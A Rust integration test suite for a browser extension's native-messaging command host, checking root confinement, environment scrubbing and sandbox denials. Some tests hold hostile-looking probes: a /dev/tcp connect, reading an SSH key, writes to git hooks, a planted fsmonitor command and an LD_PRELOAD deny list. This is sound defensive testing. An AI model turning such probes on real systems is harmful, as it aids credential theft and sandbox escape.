//! stdio.rs — drives the built `wmlhost` binary over native messaging framing, the way the extension will: facts,
//! the verdict, the sandbox's denials, cancellation, time limits, held output read in ranges, the environment scrub.

use std::io::{Read, Write};
use std::net::TcpListener;
use std::path::{Path, PathBuf};
use std::process::{Child, ChildStdin, ChildStdout, Command, Stdio};
use std::time::Duration;

use base64::Engine;
use serde_json::{Value, json};

struct Host {
    /// The owner table's ledger directory, private to this test unless shared on purpose.
    state: Option<tempfile::TempDir>,
    child: Child,
    stdin: Option<ChildStdin>,
    stdout: ChildStdout,
    seq: u64,
    events: Vec<Value>,
}

impl Host {
    fn start() -> Host {
        Host::start_with_env(&[])
    }

    fn start_with_env(extra: &[(&str, &str)]) -> Host {
        let state = tempfile::tempdir().unwrap();
        let dir = state.path().join("owners");
        let mut h = Host::start_in(&dir, extra);
        h.state = Some(state);
        h
    }

    /// A host whose owner table lives in `dir`, which another host may share.
    fn start_in(dir: &Path, extra: &[(&str, &str)]) -> Host {
        let mut c = Command::new(env!("CARGO_BIN_EXE_wmlhost"));
        c.env("WMLHOST_STATE_DIR", dir);
        c.arg("chrome-extension://abcdefghijklmnopabcdefghijklmnop/")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::inherit());
        for (k, v) in extra {
            c.env(k, v);
        }
        let mut child = c.spawn().expect("wmlhost starts");
        let stdin = child.stdin.take();
        let stdout = child.stdout.take().unwrap();
        Host { state: None, child, stdin, stdout, seq: 0, events: vec![] }
    }

    fn send(&mut self, v: &Value) {
        let b = serde_json::to_vec(v).unwrap();
        let w = self.stdin.as_mut().unwrap();
        w.write_all(&(b.len() as u32).to_ne_bytes()).unwrap();
        w.write_all(&b).unwrap();
        w.flush().unwrap();
    }

    fn recv(&mut self) -> Value {
        let mut len = [0u8; 4];
        self.stdout.read_exact(&mut len).expect("a frame from the host");
        let n = u32::from_ne_bytes(len) as usize;
        assert!(n <= 1024 * 1024, "the host sent a frame over Chrome's 1 MiB limit: {n}");
        let mut b = vec![0u8; n];
        self.stdout.read_exact(&mut b).unwrap();
        serde_json::from_slice(&b).unwrap()
    }

    /// One call; `done` events that arrive meanwhile are kept for `done`.
    fn call(&mut self, name: &str, args: Value) -> Result<Value, (String, String)> {
        self.seq += 1;
        let seq = self.seq;
        self.send(&json!({ "seq": seq, "call": name, "args": args }));
        loop {
            let m = self.recv();
            if m.get("event").is_some() {
                self.events.push(m);
                continue;
            }
            assert_eq!(m["seq"], json!(seq), "answers carry their seq");
            if let Some(e) = m.get("error") {
                return Err((e["code"].as_str().unwrap().into(), e["message"].as_str().unwrap_or("").into()));
            }
            return Ok(m["value"].clone());
        }
    }

    fn ok(&mut self, name: &str, args: Value) -> Value {
        self.call(name, args).unwrap_or_else(|e| panic!("{name} failed: {e:?}"))
    }

    fn done(&mut self, id: &str) -> Value {
        loop {
            if let Some(i) = self.events.iter().position(|e| e["id"] == json!(id)) {
                return self.events.remove(i);
            }
            let m = self.recv();
            assert!(m.get("event").is_some(), "unexpected answer while waiting for done: {m}");
            self.events.push(m);
        }
    }

    fn read_all(&mut self, stream: &Value) -> Vec<u8> {
        let ptr = stream["ptr"].as_str().expect("a pointer").to_string();
        let (mut out, mut off) = (Vec::new(), 0u64);
        loop {
            let r = self.ok("read", json!({ "ptr": ptr, "offset": off }));
            let b = base64::engine::general_purpose::STANDARD.decode(r["data"]["$bytes"].as_str().unwrap()).unwrap();
            off += b.len() as u64;
            out.extend(b);
            if r["eof"] == json!(true) {
                return out;
            }
        }
    }

    /// spawn + start + done, for calls that are expected to run.
    fn run(&mut self, args: Value) -> (Value, Value) {
        let facts = self.ok("spawn", args);
        let id = facts["id"].as_str().unwrap().to_string();
        self.ok("start", json!({ "id": id }));
        let d = self.done(&id);
        (facts, d)
    }

    fn sandbox_available(&mut self) -> bool {
        let h = self.ok("hello", json!({}));
        let avail = h["sandbox"]["available"] == json!(true);
        if cfg!(target_os = "macos") {
            assert!(avail, "Seatbelt must be available on macOS: {h}");
        } else if !avail {
            assert!(
                std::env::var("WMLHOST_REQUIRE_SANDBOX").as_deref() != Ok("1"),
                "WMLHOST_REQUIRE_SANDBOX set, but the sandbox is unavailable: {h}"
            );
            eprintln!("sandbox unavailable here, enforcement checks skipped: {}", h["sandbox"]);
        }
        avail
    }

    fn close(mut self) {
        drop(self.stdin.take());
        let _ = self.child.wait();
    }
}

fn root() -> (tempfile::TempDir, PathBuf) {
    let d = tempfile::tempdir().unwrap();
    let r = d.path().canonicalize().unwrap();
    (d, r)
}

fn text(b: &[u8]) -> String {
    String::from_utf8_lossy(b).into_owned()
}

// --- the protocol: facts first, nothing runs without start ---

#[test]
fn hello_names_the_host_and_its_sandbox() {
    let mut h = Host::start();
    let v = h.ok("hello", json!({}));
    assert_eq!(v["host"], "window-ml-host");
    assert_eq!(v["protocol"], 1);
    assert!(v["sandbox"]["kind"].is_string(), "{v}");
    h.close();
}

#[test]
fn spawn_before_configure_is_refused() {
    let mut h = Host::start();
    let e = h.call("spawn", json!({ "argv": ["true"], "cwd": "/tmp" })).unwrap_err();
    assert_eq!(e.0, "NotConfigured");
    h.close();
}

#[test]
fn git_status_in_a_repo_runs_and_its_output_is_a_pointer() {
    let (_d, r) = root();
    assert!(Command::new("git").args(["init", "-q"]).current_dir(&r).status().unwrap().success());
    std::fs::write(r.join("hello.txt"), "hi").unwrap();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let (facts, d) = h.run(json!({ "argv": ["git", "status", "--short"], "cwd": r }));
    assert!(facts["program"]["path"].as_str().unwrap().ends_with("/git"), "{facts}");
    assert_eq!(facts["cwd"], json!({ "path": r, "inRoot": true }));
    assert_eq!(facts["effects"], "unknown");
    assert_eq!(d["code"], 0, "{d}");
    assert_eq!(d["ok"], true);
    assert!(d["stdout"]["ptr"].as_str().unwrap().starts_with("out:"));
    let out = h.read_all(&d["stdout"]);
    assert!(text(&out).contains("hello.txt"), "{}", text(&out));
    h.close();
}

#[test]
fn a_spawned_call_runs_only_on_start() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let f = h.ok("spawn", json!({ "argv": ["touch", "marker"], "cwd": r }));
    std::thread::sleep(Duration::from_millis(300));
    assert!(!r.join("marker").exists(), "spawn alone must not run the program");
    h.ok("discard", json!({ "id": f["id"] }));
    assert_eq!(h.call("start", json!({ "id": f["id"] })).unwrap_err().0, "UnknownId");
    assert!(!r.join("marker").exists());
    h.close();
}

#[test]
fn a_call_starts_once() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let f = h.ok("spawn", json!({ "argv": ["true"], "cwd": r }));
    h.ok("start", json!({ "id": f["id"] }));
    assert_eq!(h.call("start", json!({ "id": f["id"] })).unwrap_err().0, "UnknownId");
    h.done(f["id"].as_str().unwrap());
    h.close();
}

#[test]
fn reconfiguring_drops_pending_calls() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let f = h.ok("spawn", json!({ "argv": ["true"], "cwd": r }));
    h.ok("configure", json!({ "roots": [r] }));
    assert_eq!(h.call("start", json!({ "id": f["id"] })).unwrap_err().0, "UnknownId");
    h.close();
}

#[test]
fn malformed_messages_are_answered_not_fatal() {
    let mut h = Host::start();
    h.send(&json!({ "call": "hello" }));
    let m = h.recv();
    assert_eq!(m["error"]["code"], "BadRequest");
    assert_eq!(m["seq"], Value::Null);
    assert_eq!(h.call("nope", json!({})).unwrap_err().0, "BadRequest");
    assert_eq!(h.call("spawn", json!({ "argv": "git status", "cwd": "/" })).unwrap_err().0, "NotConfigured");
    h.ok("hello", json!({}));
    h.close();
}

// --- roots: cwd and path arguments ---

#[test]
fn a_root_must_be_an_absolute_directory_other_than_slash() {
    let mut h = Host::start();
    assert_eq!(h.call("configure", json!({ "roots": ["/"] })).unwrap_err().0, "BadRoot");
    assert_eq!(h.call("configure", json!({ "roots": ["rel"] })).unwrap_err().0, "BadRoot");
    assert_eq!(h.call("configure", json!({ "roots": [] })).unwrap_err().0, "BadRoot");
    h.close();
}

#[test]
fn a_cwd_outside_the_roots_is_refused() {
    let (_d, r) = root();
    let (_o, outside) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    for cwd in [outside.clone(), PathBuf::from("/"), r.join("missing"), r.join("..")] {
        let e = h.call("spawn", json!({ "argv": ["true"], "cwd": cwd })).unwrap_err();
        assert_eq!(e.0, "CwdOutsideRoots", "{}", cwd.display());
    }
    h.close();
}

#[test]
fn a_symlink_out_of_a_root_is_caught_as_cwd_and_as_a_path() {
    let (_d, r) = root();
    let (_o, outside) = root();
    std::os::unix::fs::symlink(&outside, r.join("escape")).unwrap();
    std::fs::write(outside.join("f"), "x").unwrap();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let e = h.call("spawn", json!({ "argv": ["true"], "cwd": r.join("escape") })).unwrap_err();
    assert_eq!(e.0, "CwdOutsideRoots");
    let f = h.ok(
        "spawn",
        json!({ "argv": ["cat", "escape/f", "--out=escape/new"], "cwd": r,
                "pathArgs": [{ "arg": 1 }, { "arg": 2, "split": "=" }] }),
    );
    let p = &f["paths"];
    assert_eq!(p[0]["path"], json!(outside.join("f")));
    assert_eq!(p[0]["inRoot"], false);
    assert_eq!(p[0]["exists"], true);
    assert_eq!(p[1]["given"], "escape/new");
    assert_eq!(p[1]["path"], json!(outside.join("new")));
    assert_eq!(p[1]["inRoot"], false);
    h.close();
}

#[test]
fn path_facts_flag_secrets_and_paths_in_the_root() {
    let (_d, r) = root();
    std::fs::write(r.join(".env"), "K=V").unwrap();
    std::fs::write(r.join("a.txt"), "x").unwrap();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let f =
        h.ok("spawn", json!({ "argv": ["cat", ".env", "a.txt"], "cwd": r, "pathArgs": [{ "arg": 1 }, { "arg": 2 }] }));
    assert_eq!(f["paths"][0]["secret"], true);
    assert_eq!(f["paths"][0]["inRoot"], true);
    assert_eq!(f["paths"][1]["secret"], false);
    assert_eq!(f["paths"][1]["inRoot"], true);
    let e = h.call("spawn", json!({ "argv": ["cat"], "cwd": r, "pathArgs": [{ "arg": 0 }] })).unwrap_err();
    assert_eq!(e.0, "BadRequest", "argv[0] is never a path argument");
    h.close();
}

#[test]
fn a_program_not_on_path_or_a_container_call_is_refused() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    assert_eq!(h.call("spawn", json!({ "argv": ["no-such-program-wml"], "cwd": r })).unwrap_err().0, "ProgramNotFound");
    assert_eq!(
        h.call("spawn", json!({ "argv": ["true"], "cwd": r, "mode": "container" })).unwrap_err().0,
        "Unsupported"
    );
    h.close();
}

// --- the environment ---

#[test]
fn the_child_sees_the_scrubbed_base_plus_the_calls_additions() {
    let (_d, r) = root();
    let mut h = Host::start_with_env(&[("WMLHOST_TEST_LEAK", "leaked"), ("AWS_SECRET_ACCESS_KEY", "leaked")]);
    h.ok("configure", json!({ "roots": [r] }));
    let (f, d) = h.run(json!({ "argv": ["env"], "cwd": r, "env": { "WML_ADDED": "yes" } }));
    assert_eq!(f["env"]["set"], json!(["WML_ADDED"]));
    let out = text(&h.read_all(&d["stdout"]));
    assert!(!out.contains("leaked"), "{out}");
    assert!(out.contains("WML_ADDED=yes"));
    assert!(out.contains("GIT_TERMINAL_PROMPT=0"));
    h.close();
}

#[test]
fn env_names_that_run_code_are_refused_and_handles_are_unavailable() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    for n in ["PAGER", "GIT_EXTERNAL_DIFF", "LD_PRELOAD", "DYLD_INSERT_LIBRARIES", "GIT_CONFIG_COUNT", "PATH"] {
        let e = h.call("spawn", json!({ "argv": ["true"], "cwd": r, "env": { n: "x" } })).unwrap_err();
        assert_eq!(e.0, "EnvRefused", "{n}");
    }
    let e = h
        .call("spawn", json!({ "argv": ["true"], "cwd": r, "env": { "GITHUB_TOKEN": { "$secret": "github" } } }))
        .unwrap_err();
    assert_eq!(e.0, "SecretUnavailable");
    h.close();
}

// --- cancel, time limit, the end of the session ---

#[test]
fn cancel_ends_a_sleeping_process() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let f = h.ok("spawn", json!({ "argv": ["sleep", "30"], "cwd": r }));
    let id = f["id"].as_str().unwrap().to_string();
    h.ok("start", json!({ "id": id }));
    std::thread::sleep(Duration::from_millis(200));
    assert_eq!(h.ok("cancel", json!({ "id": id })), json!({ "signalled": true }));
    let d = h.done(&id);
    assert_eq!(d["cancelled"], true);
    assert_eq!(d["ok"], false);
    assert!(d["durationMs"].as_u64().unwrap() < 10_000, "{d}");
    assert_eq!(h.call("cancel", json!({ "id": id })).unwrap_err().0, "UnknownId");
    h.close();
}

#[test]
fn the_time_limit_ends_a_call() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let (_, d) = h.run(json!({ "argv": ["sleep", "30"], "cwd": r, "timeoutMs": 300 }));
    assert_eq!(d["timedOut"], true, "{d}");
    assert_eq!(d["signal"], "SIGTERM");
    h.close();
}

#[test]
fn a_call_s_background_children_end_with_it() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r], "sandbox": false }));
    // The shell exits at once, leaving a child that would write a marker later and holds stdout open meanwhile.
    let (_, d) = h.run(json!({ "argv": ["sh", "-c", "(sleep 2; touch late) & echo started"], "cwd": r }));
    assert_eq!(d["code"], 0);
    std::thread::sleep(Duration::from_millis(2500));
    assert!(!r.join("late").exists(), "the group was not killed with the call");
    h.close();
}

#[test]
fn closing_the_port_kills_running_calls() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let f = h.ok("spawn", json!({ "argv": ["sh", "-c", "sleep 2; touch late"], "cwd": r }));
    h.ok("start", json!({ "id": f["id"] }));
    h.close();
    std::thread::sleep(Duration::from_millis(2500));
    assert!(!r.join("late").exists());
}

// --- held output ---

#[test]
fn output_over_one_mebibyte_is_read_in_ranges() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    // 3 MiB of a known pattern, through `head -c` of `yes`, so the bytes are checkable.
    let (_, d) = h.run(json!({ "argv": ["sh", "-c", "yes 0123456789abcdef | head -c 3145728"], "cwd": r }));
    assert_eq!(d["stdout"]["size"], 3_145_728);
    let out = h.read_all(&d["stdout"]);
    assert_eq!(out.len(), 3_145_728);
    assert!(out.chunks(17).take(1000).all(|c| c == b"0123456789abcdef\n"));
    use sha2::Digest;
    assert_eq!(d["stdout"]["sha256"], json!(hex::encode(sha2::Sha256::digest(&out))));
    let e = h.call("read", json!({ "ptr": "out:0000", "offset": 0 })).unwrap_err();
    assert_eq!(e.0, "UnknownPtr");
    h.ok("release", json!({ "ptr": d["stdout"]["ptr"] }));
    assert_eq!(h.call("read", json!({ "ptr": d["stdout"]["ptr"] })).unwrap_err().0, "UnknownPtr");
    h.close();
}

#[test]
fn the_output_cap_truncates_and_says_so() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r], "outputCap": 1000 }));
    let (_, d) = h.run(json!({ "argv": ["sh", "-c", "yes | head -c 100000"], "cwd": r }));
    assert_eq!(d["code"], 0, "the program was not blocked by the cap: {d}");
    assert_eq!(d["stdout"]["size"], 1000);
    assert_eq!(d["stdout"]["truncated"], true);
    h.close();
}

// --- the OS sandbox ---

#[test]
fn the_sandbox_confines_writes_to_the_roots() {
    let (_d, r) = root();
    let (_o, outside) = root();
    let mut h = Host::start();
    if !h.sandbox_available() {
        let c = h.ok("configure", json!({ "roots": [r] }));
        assert_eq!(c["sandboxed"], false, "fails closed: reported, never silent");
        let f = h.ok("spawn", json!({ "argv": ["true"], "cwd": r }));
        assert_eq!(f["sandboxed"], false);
        assert_eq!(f["placement"], "host-plain");
        return h.close();
    }
    let c = h.ok("configure", json!({ "roots": [r] }));
    assert_eq!(c["sandboxed"], true);
    let (f, d) = h.run(json!({ "argv": ["touch", outside.join("pwned")], "cwd": r }));
    assert_eq!(f["placement"], "host-sandbox");
    assert_ne!(d["code"], 0, "{d}");
    assert!(!outside.join("pwned").exists(), "a write outside the roots got through");
    let (_, d) = h.run(json!({ "argv": ["touch", "inside"], "cwd": r }));
    assert_eq!(d["code"], 0, "{}", text(&h.read_all(&d["stderr"])));
    assert!(r.join("inside").exists());
    // $TMPDIR is the call's own and writable
    let (_, d) = h.run(json!({ "argv": ["sh", "-c", "echo x > \"$TMPDIR/t\" && cat \"$TMPDIR/t\""], "cwd": r }));
    assert_eq!(d["code"], 0, "{}", text(&h.read_all(&d["stderr"])));
    h.close();
}

#[test]
fn the_sandbox_keeps_files_that_run_code_later_read_only() {
    let (_d, r) = root();
    assert!(Command::new("git").args(["init", "-q"]).current_dir(&r).status().unwrap().success());
    let mut h = Host::start();
    if !h.sandbox_available() {
        return h.close();
    }
    h.ok("configure", json!({ "roots": [r] }));
    // Each target EXISTS when the call starts: that much both sandboxes guarantee. A protected path created during the
    // call is the next test's.
    std::fs::create_dir_all(r.join(".vscode")).unwrap();
    std::fs::write(r.join(".vscode/settings.json"), "{}").unwrap();
    std::fs::write(r.join(".git/hooks/pre-commit"), "#!/bin/sh\n").unwrap();
    for target in [".git/hooks/pre-commit", ".git/config", ".vscode/settings.json"] {
        let script = format!("echo x >> {target}");
        let before = std::fs::read(r.join(target)).ok();
        let (_, d) = h.run(json!({ "argv": ["sh", "-c", script], "cwd": r }));
        assert_ne!(d["code"], 0, "{target} was writable");
        assert_eq!(std::fs::read(r.join(target)).ok(), before, "{target} changed");
    }
    // ...while ordinary git work in the repository still writes.
    std::fs::write(r.join("a"), "a").unwrap();
    let (_, d) = h.run(json!({ "argv": ["git", "add", "a"], "cwd": r }));
    assert_eq!(d["code"], 0, "{}", text(&h.read_all(&d["stderr"])));
    h.close();
}

#[test]
fn the_sandbox_denies_a_network_connect() {
    let (_d, r) = root();
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    listener.set_nonblocking(true).unwrap();
    let port = listener.local_addr().unwrap().port();
    let script = format!("exec 3<>/dev/tcp/127.0.0.1/{port} && echo connected");
    let connected = |l: &TcpListener| l.accept().is_ok();
    let mut h = Host::start();
    if !h.sandbox_available() {
        return h.close();
    }
    // Control: unsandboxed, the same call connects, so the test can see a connection.
    h.ok("configure", json!({ "roots": [r], "sandbox": false }));
    let (_, d) = h.run(json!({ "argv": ["bash", "-c", script], "cwd": r }));
    assert_eq!(d["code"], 0, "control: {}", text(&h.read_all(&d["stderr"])));
    assert!(connected(&listener), "control connection not seen");
    h.ok("configure", json!({ "roots": [r] }));
    let (_, d) = h.run(json!({ "argv": ["bash", "-c", script], "cwd": r }));
    assert_ne!(d["code"], 0, "a sandboxed connect succeeded");
    std::thread::sleep(Duration::from_millis(100));
    assert!(!connected(&listener), "a sandboxed connect reached the listener");
    h.close();
}

#[test]
fn the_sandbox_hides_credential_stores_unless_the_call_names_one() {
    let home = tempfile::tempdir().unwrap();
    let home_r = home.path().canonicalize().unwrap();
    std::fs::create_dir(home_r.join(".ssh")).unwrap();
    std::fs::write(home_r.join(".ssh/id_test"), "PRIVATE").unwrap();
    let (_d, r) = root();
    let mut h = Host::start_with_env(&[("HOME", home_r.to_str().unwrap())]);
    if !h.sandbox_available() {
        return h.close();
    }
    h.ok("configure", json!({ "roots": [r] }));
    let key = home_r.join(".ssh/id_test");
    // Reached without being named (a directory walk would do this): denied.
    let (_, d) = h.run(json!({ "argv": ["sh", "-c", format!("cat {}", key.display())], "cwd": r }));
    assert_ne!(d["code"], 0);
    assert!(!text(&h.read_all(&d["stdout"])).contains("PRIVATE"));
    // Named as a path argument, flagged secret in the facts the person approved: readable.
    let (f, d) = h.run(json!({ "argv": ["cat", key], "cwd": r, "pathArgs": [{ "arg": 1 }] }));
    assert_eq!(f["paths"][0]["secret"], true);
    assert_eq!(text(&h.read_all(&d["stdout"])), "PRIVATE");
    h.close();
}

#[test]
fn held_output_is_hidden_from_children() {
    let (_d, r) = root();
    let mut h = Host::start();
    if !h.sandbox_available() {
        return h.close();
    }
    h.ok("configure", json!({ "roots": [r] }));
    let (_, d) = h.run(json!({ "argv": ["echo", "first-output"], "cwd": r }));
    assert_eq!(d["code"], 0);
    // The store is $TMPDIR/../../out; a sandboxed child must not list or read it.
    let (_, d) = h.run(json!({ "argv": ["sh", "-c", "cat \"$TMPDIR\"/../../out/*"], "cwd": r }));
    assert!(!text(&h.read_all(&d["stdout"])).contains("first-output"));
    h.close();
}

#[test]
fn git_status_does_not_write_the_index() {
    let (_d, r) = root();
    let git = |args: &[&str]| assert!(Command::new("git").args(args).current_dir(&r).status().unwrap().success());
    git(&["init", "-q"]);
    std::fs::write(r.join("a"), "a").unwrap();
    git(&["add", "a"]);
    // Touch the file so its stat data is stale: a plain `git status` would refresh the index here.
    std::thread::sleep(Duration::from_millis(1100));
    std::fs::write(r.join("a"), "a").unwrap();
    let before = std::fs::metadata(r.join(".git/index")).unwrap().modified().unwrap();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r], "sandbox": false }));
    let (_, d) = h.run(json!({ "argv": ["git", "status", "--short"], "cwd": r }));
    assert_eq!(d["code"], 0);
    assert_eq!(
        std::fs::metadata(r.join(".git/index")).unwrap().modified().unwrap(),
        before,
        "git status refreshed the index"
    );
    h.close();
}

// --- the repository's own config, and what a recursive reader reaches (rulings of 2026-10-15) ---

#[test]
fn a_planted_fsmonitor_does_not_run_and_the_facts_say_the_config_runs_code() {
    let (_d, r) = root();
    let git = |args: &[&str]| assert!(Command::new("git").args(args).current_dir(&r).status().unwrap().success());
    git(&["init", "-q"]);
    let marker = r.join("fsmonitor-ran");
    git(&["config", "core.fsmonitor", &format!("touch {}; false", marker.display())]);
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r], "sandbox": false }));
    let (f, d) = h.run(json!({ "argv": ["git", "status", "--short"], "cwd": r }));
    assert_eq!(d["code"], 0, "{}", text(&h.read_all(&d["stderr"])));
    assert!(!marker.exists(), "the repository's fsmonitor ran");
    assert_eq!(f["repoConfigRunsCode"], true);
    assert_eq!(f["repo"]["root"], json!(r));
    assert!(f["repo"]["reasons"][0].as_str().unwrap().starts_with("core.fsmonitor"), "{f}");
    h.close();
}

#[test]
fn a_plain_repository_runs_no_code_and_a_plain_directory_is_no_repository() {
    let (_d, r) = root();
    assert!(Command::new("git").args(["init", "-q"]).current_dir(&r).status().unwrap().success());
    let (_e, plain) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r, plain] }));
    assert_eq!(h.ok("spawn", json!({ "argv": ["true"], "cwd": r }))["repoConfigRunsCode"], false);
    let f = h.ok("spawn", json!({ "argv": ["true"], "cwd": plain }));
    assert_eq!(f["repoConfigRunsCode"], Value::Null);
    assert_eq!(f["repo"], Value::Null);
    h.close();
}

#[test]
fn a_walked_argument_or_cwd_reports_the_secrets_beneath_it() {
    let (_d, r) = root();
    std::fs::create_dir_all(r.join("src/conf")).unwrap();
    std::fs::write(r.join("src/conf/.env"), "K=V").unwrap();
    std::fs::create_dir_all(r.join("docs")).unwrap();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let f = h.ok(
        "spawn",
        json!({ "argv": ["ls", "-R", "src", "docs"], "cwd": r, "walkCwd": true,
                "pathArgs": [{ "arg": 2, "walk": true }, { "arg": 3, "walk": true }] }),
    );
    assert_eq!(f["paths"][0]["containsSecret"], true);
    assert_eq!(f["paths"][1]["containsSecret"], false);
    assert_eq!(f["cwd"]["containsSecret"], true);
    let f = h.ok("spawn", json!({ "argv": ["cat", "docs"], "cwd": r, "pathArgs": [{ "arg": 1 }] }));
    assert!(f["paths"][0].get("containsSecret").is_none(), "only a walked argument is walked");
    h.close();
}

#[test]
fn env_free_is_true_only_for_the_free_list() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let f = |h: &mut Host, env: Value| {
        h.ok("spawn", json!({ "argv": ["true"], "cwd": r, "env": env }))["env"]["free"].clone()
    };
    assert_eq!(f(&mut h, json!({ "LC_ALL": "C", "TZ": "UTC" })), true);
    assert_eq!(f(&mut h, json!({ "RUST_LOG": "debug" })), false);
    h.close();
}

#[test]
fn a_protected_path_created_during_the_call_is_denied_on_macos_and_a_known_gap_on_linux() {
    let (_d, r) = root();
    let mut h = Host::start();
    if !h.sandbox_available() {
        return h.close();
    }
    h.ok("configure", json!({ "roots": [r] }));
    // NO envelope: today's floor. On Linux that is bubblewrap alone, whose read-only binds cover only
    // what exists when the call starts — the gap this test pins stays open by design (see the sibling
    // under write: "roots", and docs/SANDBOX.md).
    let (_, d) = h.run(json!({ "argv": ["sh", "-c", "mkdir -p .vscode && echo x > .vscode/tasks.json"], "cwd": r }));
    let created = r.join(".vscode/tasks.json").exists();
    if cfg!(target_os = "macos") {
        // Seatbelt's regex covers a path that did not exist when the call started.
        assert_ne!(d["code"], 0, "{d}");
        assert!(!created, "a protected path created during the call must not appear");
    } else {
        assert_eq!(d["code"], 0, "{d}");
        assert!(created, "the Linux gap documented in SANDBOX.md has closed; flip this test and the doc");
    }
    h.close();
}

// --- the sandbox envelope: `write` and `exec` on start/pipe, applied and reported ---

/// spawn + start with an `envelope` + done.
fn run_envelope(h: &mut Host, args: Value, envelope: Value) -> (Value, Value) {
    let facts = h.ok("spawn", args);
    let id = facts["id"].as_str().unwrap().to_string();
    h.ok("start", json!({ "id": id, "envelope": envelope }));
    let d = h.done(&id);
    (facts, d)
}

/// `hello.sandbox.landlockAbi`, as a number (Some) or null (None).
fn landlock_abi(h: &mut Host) -> Option<i64> {
    let v = h.ok("hello", json!({}))["sandbox"]["landlockAbi"].clone();
    v.as_i64()
}

#[test]
fn write_none_lets_the_call_write_only_its_temp_dir() {
    let (_d, r) = root();
    let mut h = Host::start();
    if !h.sandbox_available() {
        return h.close();
    }
    h.ok("configure", json!({ "roots": [r] }));
    let (_, d) = run_envelope(
        &mut h,
        json!({ "argv": ["sh", "-c", "touch inside"], "cwd": r }),
        json!({ "write": "none", "exec": "any" }),
    );
    assert_ne!(d["code"], 0, "write: none still wrote the root: {d}");
    assert!(!r.join("inside").exists());
    let (_, d) = run_envelope(
        &mut h,
        json!({ "argv": ["sh", "-c", "echo x > \"$TMPDIR/t\" && cat \"$TMPDIR/t\""], "cwd": r }),
        json!({ "write": "none", "exec": "any" }),
    );
    assert_eq!(d["code"], 0, "write: none must keep $TMPDIR: {}", text(&h.read_all(&d["stderr"])));
    assert_eq!(d["envelope"], json!({ "write": "none", "exec": "any" }), "done reports what was applied");
    h.close();
}

#[test]
fn exec_program_only_lets_the_call_run_only_its_program() {
    let (_d, r) = root();
    let mut h = Host::start();
    if !h.sandbox_available() {
        return h.close();
    }
    h.ok("configure", json!({ "roots": [r] }));
    std::fs::create_dir(r.join("work")).unwrap();
    // `sh` runs; `ls` is not in the exec set, so `sh -c ls` cannot exec it. Writes go in an EXISTING
    // directory, because write: "roots" is name-immutable at the top level.
    let (_, d) = run_envelope(
        &mut h,
        json!({ "argv": ["sh", "-c", "echo ran > work/out.txt"], "cwd": r }),
        json!({ "write": "roots", "exec": "program-only" }),
    );
    assert_eq!(d["code"], 0, "{}", text(&h.read_all(&d["stderr"])));
    assert!(r.join("work/out.txt").exists());
    let (_, d) = run_envelope(
        &mut h,
        json!({ "argv": ["sh", "-c", "ls >/dev/null"], "cwd": r }),
        json!({ "write": "roots", "exec": "program-only" }),
    );
    assert_ne!(d["code"], 0, "program-only still exec'd ls: {d}");
    assert_eq!(d["envelope"], json!({ "write": "roots", "exec": "program-only" }));
    h.close();
}

#[test]
fn an_absent_envelope_is_todays_floor_and_done_says_so() {
    let (_d, r) = root();
    let mut h = Host::start();
    if !h.sandbox_available() {
        return h.close();
    }
    h.ok("configure", json!({ "roots": [r] }));
    let (facts, d) = h.run(json!({ "argv": ["touch", "inside"], "cwd": r }));
    assert_eq!(facts["sandboxed"], true);
    assert_eq!(d["code"], 0, "{d}");
    assert!(r.join("inside").exists(), "no envelope keeps today's write");
    assert_eq!(
        d["envelope"],
        json!({ "write": "today", "exec": "any" }),
        "done reports the floor as \"today\" when the worker sent none, never \"roots\""
    );
    h.close();
}

#[test]
fn a_malformed_envelope_is_bad_request_and_never_todays_floor() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    for bad in [
        json!({ "write": "all", "exec": "any" }),
        json!({ "write": "today", "exec": "any" }), // "today" is the host's name for the floor, not a worker's
        json!({ "write": "roots", "exec": 7 }),
        json!({ "write": "roots", "exec": "any", "extra": 1 }),
        json!({ "write": "roots" }),
        json!({ "exec": "any" }),
        json!("roots"),
    ] {
        let facts = h.ok("spawn", json!({ "argv": ["true"], "cwd": r }));
        let id = facts["id"].as_str().unwrap();
        let e = h.call("start", json!({ "id": id, "envelope": bad })).unwrap_err();
        assert_eq!(e.0, "BadRequest", "envelope {bad} was not refused: {e:?}");
        // the call is consumed by the failed start and never ran
        assert!(h.call("status", json!({})).is_ok(), "host still answers after a refused start");
    }
    // a pipe with a wrong-length envelopes array is the same
    let a = h.ok("spawn", json!({ "argv": ["true"], "cwd": r }))["id"].as_str().unwrap().to_string();
    let b = h.ok("spawn", json!({ "argv": ["true"], "cwd": r }))["id"].as_str().unwrap().to_string();
    let e = h.call("pipe", json!({ "ids": [a, b], "envelopes": [{ "write": "roots", "exec": "any" }] })).unwrap_err();
    assert_eq!(e.0, "BadRequest", "{e:?}");
    h.close();
}

#[test]
